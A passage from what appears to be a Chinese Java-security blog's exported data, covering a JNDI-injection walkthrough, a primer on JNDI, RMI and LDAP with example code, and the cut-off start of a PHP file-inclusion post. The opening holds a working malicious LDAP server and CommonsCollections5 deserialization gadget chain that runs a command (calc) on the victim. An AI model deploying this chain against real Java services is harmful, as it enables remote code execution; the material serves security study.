class=\"string\">&#x27;/&#x27;</span>).concat(<span class=\"string\">&quot;.class&quot;</span>));</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;Send LDAP reference result for &quot;</span> + base + <span class=\"string\">&quot; redirecting to &quot;</span> + turl);</span><br><span class=\"line\">            e.addAttribute(<span class=\"string\">&quot;javaClassName&quot;</span>, <span class=\"string\">&quot;foo&quot;</span>);</span><br><span class=\"line\">            String cbstring = <span class=\"keyword\">this</span>.codebase.toString();</span><br><span class=\"line\">            <span class=\"keyword\">int</span> refPos = cbstring.indexOf(<span class=\"string\">&#x27;#&#x27;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> ( refPos &gt; <span class=\"number\">0</span> ) &#123;</span><br><span class=\"line\">                cbstring = cbstring.substring(<span class=\"number\">0</span>, refPos);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            e.addAttribute(<span class=\"string\">&quot;javaSerializedData&quot;</span>,CommonsCollections5());</span><br><span class=\"line\"></span><br><span class=\"line\">            result.sendSearchEntry(e);</span><br><span class=\"line\">            result.setResult(<span class=\"keyword\">new</span> LDAPResult(<span class=\"number\">0</span>, ResultCode.SUCCESS));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">byte</span>[] CommonsCollections5() <span class=\"keyword\">throws</span> Exception&#123;</span><br><span class=\"line\">        Transformer[] transformers=<span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;&#125;&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>,<span class=\"keyword\">new</span> Object[]&#123;&#125;&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>,<span class=\"keyword\">new</span> Class[]&#123;String.class&#125;,<span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\"></span><br><span class=\"line\">        ChainedTransformer chainedTransformer=<span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\">        Map map=<span class=\"keyword\">new</span> HashMap();</span><br><span class=\"line\">        Map lazyMap=LazyMap.decorate(map,chainedTransformer);</span><br><span class=\"line\">        TiedMapEntry tiedMapEntry=<span class=\"keyword\">new</span> TiedMapEntry(lazyMap,<span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        BadAttributeValueExpException badAttributeValueExpException=<span class=\"keyword\">new</span> BadAttributeValueExpException(<span class=\"keyword\">null</span>);</span><br><span class=\"line\">        Field field=badAttributeValueExpException.getClass().getDeclaredField(<span class=\"string\">&quot;val&quot;</span>);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(badAttributeValueExpException,tiedMapEntry);</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream byteArrayOutputStream = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\"></span><br><span class=\"line\">        ObjectOutputStream objectOutputStream = <span class=\"keyword\">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class=\"line\">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class=\"line\">        objectOutputStream.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> byteArrayOutputStream.toByteArray();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"流程分析-3\"><a href=\"#流程分析-3\" class=\"headerlink\" title=\"流程分析\"></a>流程分析</h3><p><strong>LdapCtx#c_lookup</strong>，进行判断 <strong>JAVA_ATTRIBUTES[2]</strong> 即 javaclassname 不为空，进入<strong>Obj#decodeObject</strong></p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718155901828.png\" alt=\"image-20220718155901828\"></p>\n<p>Obj#decodeObject 中 JAVA_ATTRIBUTES[4] 空，尝试获取 JAVA_ATTRIBUTES[1]，即序列化的字节码。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718160557209.png\" alt=\"image-20220718160557209\"></p>\n<p>deserializeObject，反序列化</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/jndi/image-20220718160806948.png\" alt=\"image-20220718160806948\"></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://tttang.com/archive/1611/#toc_gadget\">JNDI注入分析</a></p>\n<p><a href=\"https://xz.aliyun.com/t/8214#toc-2\">JNDI注入学习</a></p>\n<p><a href=\"https://www.mi1k7ea.com/2019/09/15/%E6%B5%85%E6%9E%90JNDI%E6%B3%A8%E5%85%A5/\">浅析JNDI注入</a></p>\n<p><a href=\"https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html\">如何绕过高版本JDK的限制进行</a></p>\n","categories":["JavaSec"]},{"title":"JNDI注入-基础知识","url":"/2023/12/25/JNDI%E6%B3%A8%E5%85%A5/","content":"<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>弄清JNDI RMI LDAP等基础概念以及手动操作实现</p>\n<h1 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h1><p>JNDI 全称为 <strong>Java Naming and Directory Interface(Java 命名与目录接口)</strong> 是SUN公司提供的一种标准的 <strong>Java命名系统接口</strong>，JNDI提供统一的客户端API，通过不同的访问提供者接口JNDI服务供应接口(SPI)的实现，由管理者将JNDI API映射为特定的命名服务和目录系统，使得Java应用程序可以和这些命名服务和目录服务之间进行交互。目录服务是命名服务的一种自然扩展。</p>\n<a id=\"more\"></a>\n<p><strong>命名的意思</strong> 就是，在一个目录系统，它实现了<strong>把一个服务名称和对象或命名引用相关联</strong>，在客户端，我们可以调用目录系统服务，并根据服务名称查询到相关联的对象或命名引用，然后返回给客户端。而 <strong>目录的意思</strong> 就是在命名的基础上，<strong>增加了属性的概念</strong>，我们可以想象一个文件目录中，每个文件和目录都会存在着一些属性，比如创建时间、读写执行权限等等，并且我们可以通过这些相关属性筛选出相应的文件和目录</p>\n<p>也就是说：JNDI是一个接口，在这个接口下会有<strong>多种目录系统服务的实现</strong>，我们能通过名称等去找到相关的对象，并把它下载到客户端中来。</p>\n<p>JNDI可访问的现有的目录及服务主要有：</p>\n<ul>\n<li><p>RMI: Java Remote Method Invocation，Java 远程方法调用；特有的远程调用框架</p>\n</li>\n<li><p>LDAP: 轻量级目录访问协议；通用的服务与标准</p>\n</li>\n<li><p>CORBA: Common Object Request Broker Architecture，通用对象请求代理架构; 通用的服务与标准</p>\n</li>\n</ul>\n<h1 id=\"JNDI结构\"><a href=\"#JNDI结构\" class=\"headerlink\" title=\"JNDI结构\"></a>JNDI结构</h1><p>在Java JDK里面提供了5个包，提供给JNDI的功能实现，分别是：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">javax.naming：主要用于命名操作，它包含了命名服务的类和接口，该包定义了Context接口和InitialContext类；</span><br><span class=\"line\"></span><br><span class=\"line\">javax.naming.directory：主要用于目录操作，它定义了DirContext接口和InitialDirContext类；</span><br><span class=\"line\"></span><br><span class=\"line\">javax.naming.event：在命名目录服务器中请求事件通知；</span><br><span class=\"line\"></span><br><span class=\"line\">javax.naming.ldap：提供LDAP支持；</span><br><span class=\"line\"></span><br><span class=\"line\">javax.naming.spi：允许动态插入不同实现，为不同命名目录服务供应商的开发人员提供开发和实现的途径，以便应用程序通过JNDI可以访问相关服务。</span><br></pre></td></tr></table></figure>\n\n<p>在 <strong>javax.naming</strong> 中包含了访问目录服务所需的 <strong>类和接口</strong>，比如 Context、Bindings、References、lookup 等。 </p>\n<p>这里解释一下</p>\n<h2 id=\"InitialContext类\"><a href=\"#InitialContext类\" class=\"headerlink\" title=\"InitialContext类\"></a>InitialContext类</h2><h3 id=\"构造方法\"><a href=\"#构造方法\" class=\"headerlink\" title=\"构造方法\"></a>构造方法</h3><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">InitialContext() </span><br><span class=\"line\">构建一个初始上下文。  </span><br><span class=\"line\">InitialContext(<span class=\"keyword\">boolean</span> lazy) </span><br><span class=\"line\">构造一个初始上下文，并选择不初始化它。  </span><br><span class=\"line\">InitialContext(Hashtable&lt;?,?&gt; environment) </span><br><span class=\"line\">使用提供的环境构建初始上下文。 </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//java</span></span><br><span class=\"line\">InitialContext initialContext = <span class=\"keyword\">new</span> InitialContext();</span><br></pre></td></tr></table></figure>\n\n<p>构建初始上下文，其实通俗点来讲就是获取初始目录环境</p>\n<h3 id=\"常用方法\"><a href=\"#常用方法\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">bind(Name name, Object obj) </span><br><span class=\"line\">    将名称绑定到对象。 </span><br><span class=\"line\">list(String name) </span><br><span class=\"line\">    枚举在命名上下文中绑定的名称以及绑定到它们的对象的类名。</span><br><span class=\"line\">lookup(String name) </span><br><span class=\"line\">    检索命名对象。 </span><br><span class=\"line\">rebind(String name, Object obj) </span><br><span class=\"line\">    将名称绑定到对象，覆盖任何现有绑定。 </span><br><span class=\"line\">unbind(String name) </span><br><span class=\"line\">    取消绑定命名对象。 </span><br></pre></td></tr></table></figure>\n\n<p>example:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.InitialContext;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.NamingException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jndi</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NamingException </span>&#123;</span><br><span class=\"line\">        String uri = <span class=\"string\">&quot;rmi://127.0.0.1:1099/work&quot;</span>;</span><br><span class=\"line\">        InitialContext initialContext = <span class=\"keyword\">new</span> InitialContext();</span><br><span class=\"line\">        initialContext.lookup(uri);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"References\"><a href=\"#References\" class=\"headerlink\" title=\"References\"></a><strong>References</strong></h2><p>该类表示对在命名/目录系统 <strong>外部找到的对象的引用</strong></p>\n<h3 id=\"构造方法-1\"><a href=\"#构造方法-1\" class=\"headerlink\" title=\"构造方法\"></a>构造方法</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Reference(String className) </span><br><span class=\"line\">    为类名为“className”的对象构造一个新的引用。  </span><br><span class=\"line\">Reference(String className, RefAddr addr) </span><br><span class=\"line\">    为类名为“className”的对象和地址构造一个新引用。  </span><br><span class=\"line\">Reference(String className, RefAddr addr, String factory, String factoryLocation) </span><br><span class=\"line\">    为类名为“className”的对象，对象工厂的类名和位置以及对象的地址构造一个新引用。  </span><br><span class=\"line\">Reference(String className, String factory, String factoryLocation) </span><br><span class=\"line\">    为类名为“className”的对象以及对象工厂的类名和位置构造一个新引用。  </span><br><span class=\"line\">    </span><br><span class=\"line\">&#x2F;&#x2F;java</span><br><span class=\"line\">String url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;;</span><br><span class=\"line\">Reference reference &#x3D; new Reference(&quot;test&quot;, &quot;test&quot;, url);</span><br></pre></td></tr></table></figure>\n\n<p>参数1：<code>className</code> - 远程加载时所使用的类名</p>\n<p>参数2：<code>classFactory</code> - 加载的<code>class</code>中需要实例化类的名称</p>\n<p>参数3：<code>classFactoryLocation</code> - 提供<code>classes</code>数据的地址可以是<code>file/ftp/http</code>协议</p>\n<h3 id=\"常用方法-1\"><a href=\"#常用方法-1\" class=\"headerlink\" title=\"常用方法\"></a>常用方法</h3><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void add(int posn, RefAddr addr) </span><br><span class=\"line\">    将地址添加到索引posn的地址列表中。  </span><br><span class=\"line\">void add(RefAddr addr) </span><br><span class=\"line\">    将地址添加到地址列表的末尾。  </span><br><span class=\"line\">void clear() </span><br><span class=\"line\">    从此引用中删除所有地址。  </span><br><span class=\"line\">RefAddr get(int posn) </span><br><span class=\"line\">    检索索引posn上的地址。  </span><br><span class=\"line\">RefAddr get(String addrType) </span><br><span class=\"line\">    检索地址类型为“addrType”的第一个地址。  </span><br><span class=\"line\">Enumeration&lt;RefAddr&gt; getAll() </span><br><span class=\"line\">    检索本参考文献中地址的列举。  </span><br><span class=\"line\">String getClassName() </span><br><span class=\"line\">    检索引用引用的对象的类名。  </span><br><span class=\"line\">String getFactoryClassLocation() </span><br><span class=\"line\">    检索此引用引用的对象的工厂位置。  </span><br><span class=\"line\">String getFactoryClassName() </span><br><span class=\"line\">    检索此引用引用对象的工厂的类名。    </span><br><span class=\"line\">Object remove(int posn) </span><br><span class=\"line\">    从地址列表中删除索引posn上的地址。  </span><br><span class=\"line\">int size() </span><br><span class=\"line\">    检索此引用中的地址数。  </span><br><span class=\"line\">String toString() </span><br><span class=\"line\">    生成此引用的字符串表示形式。  </span><br></pre></td></tr></table></figure>\n\n<p>example:</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.NamingException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.naming.Reference;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.AlreadyBoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">jndi</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> NamingException, RemoteException, AlreadyBoundException </span>&#123;</span><br><span class=\"line\">        String url = <span class=\"string\">&quot;http://127.0.0.1:8080&quot;</span>; </span><br><span class=\"line\">        Registry registry = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        Reference reference = <span class=\"keyword\">new</span> Reference(<span class=\"string\">&quot;test&quot;</span>, <span class=\"string\">&quot;test&quot;</span>, url);</span><br><span class=\"line\">        ReferenceWrapper referenceWrapper = <span class=\"keyword\">new</span> ReferenceWrapper(reference);</span><br><span class=\"line\">        registry.bind(<span class=\"string\">&quot;aa&quot;</span>,referenceWrapper);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"RMI\"><a href=\"#RMI\" class=\"headerlink\" title=\"RMI\"></a>RMI</h1><p>RMI，即 <strong>Remote Method Invocation</strong>，Java 的远程方法调用。RMI 为应用提供了远程调用的接口，可以理解为 Java 自带的 RPC 框架</p>\n<p>一个简单的 RMI <code>hello world</code> 主要由三部分组成，分别是接口、服务端和客户端</p>\n<p><a href=\"https://www.cnblogs.com/wxisme/p/5296441.html\">远程方法调用（RMI）原理与示例 - Pickle - 博客园 (cnblogs.com)</a></p>\n<h2 id=\"过程\"><a href=\"#过程\" class=\"headerlink\" title=\"过程\"></a>过程</h2><p>当客户端调用远程对象方法时, <strong>存根</strong> 负责把要调用的远程对象方法的方法名及其参数编组打包,并将该包向下经远程引用层、传输层 <strong>转发给远程对象所在的服务器</strong>。通过 RMI 系统的 <strong>RMI 注册表</strong>实现的简单服务器名字服务, 可定位远程对象所在的服务器。该包到达服务器后, 向上经远程引用层, 被远程对象的 Skeleton 接收, 此 Skeleton 解析客户包中的方法名及编组的参数后, <strong>在服务器端执行客户要调用的远程对象方法</strong>, 然后将 <strong>该方法的返回值</strong>( 或产生的异常) 打包后通过相反路线返回给客户端, 客户端的 Stub 将返回结果解析后传递给客户程序。</p>\n<p>RMI远方法程调用步骤：</p>\n<ul>\n<li>1、客户调用客户端辅助对象stub上的方法</li>\n<li>2、客户端辅助对象stub打包调用信息（变量、方法名），通过网络发送给服务端辅助对象skeleton</li>\n<li>3、服务端辅助对象skeleton将客户端辅助对象发送来的信息解包，找出真正被调用的方法以及该方法所在对象</li>\n<li>4、调用真正服务对象上的真正方法，并将结果返回给服务端辅助对象skeleton</li>\n<li>5、服务端辅助对象将结果打包，发送给客户端辅助对象stub</li>\n<li>6、客户端辅助对象将返回值解包，返回给调用者</li>\n<li>7、客户获得返回值</li>\n</ul>\n<p><img src=\"https://img-blog.csdnimg.cn/98f888122f0c4c998d65bb6b475145e6.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<p><img src=\"https://img-blog.csdnimg.cn/c1bfc6b1cc5747c89c89047422e0d745.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<h2 id=\"Stub获取方式\"><a href=\"#Stub获取方式\" class=\"headerlink\" title=\"Stub获取方式\"></a>Stub获取方式</h2><p>Stub的获取方式有很多，常见的方法是调用某个远程服务上的方法，向远程服务获取存根。但是调用远程方法又必须先有远程对象的Stub，所以这里有个死循环问题。JDK提供了一个<strong>RMI注册表</strong>（RMIRegistry）来解决这个问题。RMIRegistry也是一个远程对象，默认监听在1099端口上，可以使用代码启动RMIRegistry，也可以使用rmiregistry命令。要注册远程对象，需要RMI URL和一个远程对象的引用。</p>\n<figure class=\"highlight cpp\"><table><tr><td class=\"code\"><pre><span class=\"line\">IHello rhello = <span class=\"keyword\">new</span> HelloImpl();</span><br><span class=\"line\">LocateRegistry.createRegistry(<span class=\"number\">1099</span>);<span class=\"comment\">//人工创建RMI注册服务</span></span><br><span class=\"line\">Naming.bind(<span class=\"string\">&quot;rmi://0.0.0.0:1099/hello&quot;</span>, rhello);</span><br></pre></td></tr></table></figure>\n\n<p><strong>LocateRegistry.getRegistry()</strong> 会使用给定的主机和端口等信息 <strong>本地创建一个Stub对象</strong>作为Registry远程对象的代理，从而启动整个远程调用逻辑。<strong>服务端应用程序可以向RMI注册表中注册远程对象</strong>，然后客户端向RMI注册表查询某个远程对象名称，来获取该远程对象的Stub。</p>\n<h2 id=\"动态加载类\"><a href=\"#动态加载类\" class=\"headerlink\" title=\"动态加载类\"></a>动态加载类</h2><p>RMI核心特点之一就是动态加载类，如果当前JVM中没有某个类的定义，它可以从远程URL去下载这个类的class，java.rmi.server.codebase属性值表示一个或多个URL位置，可以从中下载本地找不到的类，相当于一个代码库。动态加载的对象class文件可以使用Web服务的方式（如http://、ftp://、file://）进行托管。客户端使用了与RMI注册表相同的机制。RMI服务端将URL传递给客户端，客户端通过HTTP请求下载这些类。</p>\n<p>无论是客户端还是服务端要远程加载类，都需要满足以下条件：</p>\n<ul>\n<li><p>由于Java SecurityManager的限制，默认是不允许远程加载的，如果需要进行远程加载类，需要安装RMISecurityManager并且配置java.security.policy，这在后面的利用中可以看到。</p>\n</li>\n<li><p>属性 java.rmi.server.useCodebaseOnly 的值必需为false。但是从 <strong>JDK 6u45、7u21</strong> 开始，java.rmi.server.useCodebaseOnly 的默认值就是true。当该值为true时，将禁用自动加载远程类文件，仅从CLASSPATH和当前虚拟机的java.rmi.server.codebase 指定路径加载类文件。使用这个属性来防止虚拟机从其他Codebase地址上动态加载类，增加了RMI ClassLoader的安全性。</p>\n</li>\n</ul>\n<h2 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h2><p>在Server与Client中都需要定义相同接口，继承Remote</p>\n<p>C/S的接口：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.Remote;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">interface</span> <span class=\"title\">Hello</span> <span class=\"keyword\">extends</span> <span class=\"title\">Remote</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\">String <span class=\"title\">sayHello</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RemoteException</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Server端：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.AlreadyBoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.server.UnicastRemoteObject;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Server</span> <span class=\"keyword\">implements</span> <span class=\"title\">Hello</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//作用一：实现接口</span></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> String <span class=\"title\">sayHello</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> RuntimeException </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;hello world&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//作用二：创建注册中心，绑定等功能</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> RemoteException, AlreadyBoundException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//创建远程对象</span></span><br><span class=\"line\">        HelloImpl obj = <span class=\"keyword\">new</span> HelloImpl();</span><br><span class=\"line\">        <span class=\"comment\">//绑定到rmi服务，0代表端口为随机</span></span><br><span class=\"line\">        Hello stub = (Hello) UnicastRemoteObject.exportObject(obj,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"comment\">//注册中心，通过注册中心去获取远程对象</span></span><br><span class=\"line\">        Registry registry = LocateRegistry.createRegistry(<span class=\"number\">1099</span>);</span><br><span class=\"line\">        <span class=\"comment\">//进行名称绑定</span></span><br><span class=\"line\">        registry.bind(<span class=\"string\">&quot;hello&quot;</span>,stub);</span><br><span class=\"line\"></span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;Server ready!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Client端：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.NotBoundException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.RemoteException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.LocateRegistry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Client</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> RemoteException, NotBoundException </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//LocateRegistry.getRegistry()会使用给定的主机和端口等信息本地创建一个Stub对象作为Registry远程对象的代理</span></span><br><span class=\"line\">        Registry registry = LocateRegistry.getRegistry(<span class=\"string\">&quot;127.0.0.1&quot;</span>,<span class=\"number\">1099</span>);</span><br><span class=\"line\">        <span class=\"comment\">//通过lookup进行查找对应绑定的名称</span></span><br><span class=\"line\">        Hello hello = (Hello) registry.lookup(<span class=\"string\">&quot;hello&quot;</span>);</span><br><span class=\"line\">        <span class=\"comment\">//接受远程对象返回的“hello world”</span></span><br><span class=\"line\">        String response = hello.sayHello();</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;remote response:&quot;</span>+response);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>先启动Server端，在启动Client端后，接受远程返回的 hello world</p>\n<p><img src=\"https://img-blog.csdnimg.cn/8ae886fdc50049399d8f3df303646392.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBARmYuY2hlbmc=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center\"></p>\n<h1 id=\"LDAP\"><a href=\"#LDAP\" class=\"headerlink\" title=\"LDAP\"></a>LDAP</h1><p>LDAP（Lightweight Directory Access Protocol）-轻量目录访问协议。但看了这个解释等于没说，其实差不多是个数据库，<br>具有以下特点：</p>\n<ol>\n<li>基于TCP/IP协议</li>\n<li>同样也是分成服务端/客户端；同样也是服务端存储数据，客户端与服务端连接进行操作</li>\n<li>相对于mysql的表型存储；不同的是LDAP使用 <strong>树型存储</strong></li>\n</ol>\n<p>树层次分为以下几层：</p>\n<ul>\n<li>dn：一条记录的详细位置，由以下几种属性组成</li>\n<li>dc: 一条记录所属区域（哪一个树，相当于MYSQL的数据库）</li>\n<li>ou：一条记录所处的分叉（哪一个分支，支持多个ou，代表分支后的分支）</li>\n<li>cn/uid：一条记录的名字/ID（树的叶节点的编号，想到与MYSQL的表主键？）</li>\n</ul>\n<p>举个例子一条记录就是</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">dn&#x3D;&quot;uid&#x3D;songtao.xu,ou&#x3D;oa,dc&#x3D;example,dc&#x3D;com&quot;</span><br></pre></td></tr></table></figure>\n\n<p>详细介绍：<a href=\"https://zhuanlan.zhihu.com/p/147768058\">LDAP 协议入门（轻量目录访问协议） - 知乎 (zhihu.com)</a></p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://www.cnblogs.com/wxisme/p/5296441.html\">远程方法调用（RMI）原理与示例 - Pickle - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.freebuf.com/articles/web/317622.html\">十一、RMI、JNDI、LDAP介绍+log4j漏洞分析 - FreeBuf网络安全行业门户</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/445350185\">JNDI 注入漏洞的前世今生 - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://www.cnblogs.com/nice0e3/p/13958047.html\">Java安全之JNDI注入 - nice_0e3 - 博客园 (cnblogs.com)</a></p>\n<p><a href=\"https://www.anquanke.com/post/id/199481\">JNDI with RMI - 安全客，安全资讯平台 (anquanke.com)</a></p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/147768058\">LDAP 协议入门（轻量目录访问协议） - 知乎 (zhihu.com)</a></p>\n<p><a href=\"https://cloud.tencent.com/developer/article/1554406\">Java 中 RMI、JNDI、LADP、JRMP、JMX、JMS那些事儿（上） - 云+社区 - 腾讯云 (tencent.com)</a></p>\n<p><a href=\"https://www.jianshu.com/p/776c56fc3a80\">RMI、LDAP、CORBA与JNDI攻击 - 简书 (jianshu.com)</a></p>\n","categories":["JavaSec"]},{"title":"关于LFI","url":"/2023/12/25/LFI/","content":"<p>﻿# 前言</p>\n<h1 id=\"pearcmd-php\"><a href=\"#pearcmd-php\" class=\"headerlink\" title=\"pearcmd.php\"></a>pearcmd.php</h1><p><a href=\"https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html#\">Docker PHP裸文件本地包含综述</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span 